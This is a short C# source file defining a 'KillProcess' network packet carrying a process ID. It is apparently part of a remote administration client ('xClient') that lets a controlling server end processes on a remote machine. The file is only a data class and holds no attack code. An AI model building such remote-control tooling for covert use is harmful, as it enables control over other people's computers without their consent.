﻿using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class KillProcess : IPacket
    {
        [ProtoMember(1)]
        public int PID { get; set; }

        public KillProcess()
        {
        }

        public KillProcess(int pid)
        {
            this.PID = pid;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}